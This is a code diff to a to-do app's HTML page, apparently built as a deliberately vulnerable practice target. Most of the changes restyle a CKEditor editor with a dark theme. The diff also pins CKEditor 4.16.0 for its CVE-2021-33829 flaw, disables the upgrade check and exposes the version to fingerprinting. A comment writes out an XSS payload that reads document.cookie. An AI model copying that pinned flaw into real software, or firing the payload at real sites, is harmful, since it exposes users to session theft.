@@ -4,11 +4,12 @@
   <meta charset="UTF-8">
   <link rel="icon" type="image/svg+xml" href="/assets/logo.svg">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="generator" content="CKEditor 4.16.0">
   <title>Tasks — Todoer</title>
   <link rel="stylesheet" href="/styles.css">
   <!-- CKEditor 4.16.0 — rich text editing for task descriptions -->
   <script src="https://cdn.ckeditor.com/4.16.0/standard/ckeditor.js"></script>
+  <!-- Expose version for Wappalyzer fingerprinting -->
+  <meta name="generator" content="CKEditor 4.16.0">
   <style>
     /* ── Toast ── */
     .toast {
@@ -730,11 +731,12 @@
 
     // ── CKEditor 4.16.0 init ──
     // Pinned to vulnerable version — CVE-2021-33829
-    // Description content is stored and rendered as raw HTML (intentional vuln surface)
+    // Payload: Xss<!--{cke_protected}--!><img src=1 onerror=alert(document.cookie)> -->Attack
     let editor = null;
     function initEditor() {
       if (editor) { try { editor.destroy(); } catch {} }
       editor = CKEDITOR.replace('taskDescription', {
+        versionCheck: false, // suppress upgrade nag — intentionally pinned to vulnerable version
         toolbar: [
           { name: 'basicstyles', items: ['Bold','Italic','Underline','Strike','-','RemoveFormat'] },
           { name: 'paragraph',   items: ['NumberedList','BulletedList','-','Blockquote'] },
@@ -745,17 +747,53 @@
         ],
         height: 160,
         removePlugins: 'elementspath,resize',
+        skin: 'moono-lisa',
         contentsCss: `
-          body { font-family: 'Sora', 'Inter', sans-serif; font-size: 13.5px;
-                 color: #c9d1d9; background: transparent; margin: 8px 12px; }
-          p { margin: 0 0 6px; } ul, ol { padding-left: 18px; margin: 0 0 6px; }
-        `,
-        on: {
-          instanceReady: function() {
-            // Style the iframe body for dark theme
-            this.document.getBody().setStyle('background', 'transparent');
+          body {
+            font-family: 'Sora', 'Inter', sans-serif;
+            font-size: 13.5px;
+            color: #c9d1d9;
+            background: #161b22;
+            margin: 8px 12px;
+            line-height: 1.6;
           }
-        }
+          p { margin: 0 0 6px; }
+          ul, ol { padding-left: 18px; margin: 0 0 6px; }
+          a { color: #58a6ff; }
+        `
+      });
+
+      // Dark-theme the toolbar chrome once the editor iframe is ready
+      editor.on('instanceReady', function() {
+        // Inject dark styles into the editor's parent DOM (the CKEditor chrome lives outside the iframe)
+        const editorEl = document.getElementById(editor.id);
+        if (!editorEl) return;
+        const wrap = editorEl.closest('.cke');
+        if (!wrap) return;
+        const style = document.createElement('style');
+        style.textContent = `
+          .cke_chrome       { border-color: #30363d !important; border-radius: 6px !important; overflow: hidden; }
+          .cke_top          { background: #161b22 !important; border-bottom: 1px solid #30363d !important; }
+          .cke_bottom       { background: #161b22 !important; border-top: 1px solid #30363d !important; }
+          .cke_inner        { background: #0d1117 !important; }
+          .cke_contents     { background: #161b22 !important; }
+          .cke_button       { border-radius: 4px !important; }
+          .cke_button:hover { background: #21262d !important; }
+          .cke_button_on    { background: #1f6feb !important; }
+          .cke_button__source_label,
+          .cke_button_label { color: #8b949e !important; }
+          .cke_combo_text   { color: #8b949e !important; background: transparent !important; }
+          .cke_combo_button { background: transparent !important; border-color: #30363d !important; }
+          .cke_combo_button:hover { background: #21262d !important; }
+          .cke_toolbar_separator { background: #30363d !important; }
+          .cke_path         { background: #161b22 !important; }
+          .cke_path_item,
+          .cke_path_empty   { color: #8b949e !important; }
+          .cke_wysiwyg_frame,
+          .cke_wysiwyg_div  { background: #161b22 !important; }
+          .cke_source       { background: #0d1117 !important; color: #c9d1d9 !important; font-family: 'JetBrains Mono', monospace !important; font-size: 12.5px !important; border: none !important; }
+        `;
+        document.head.appendChild(style);
       });
     }
 
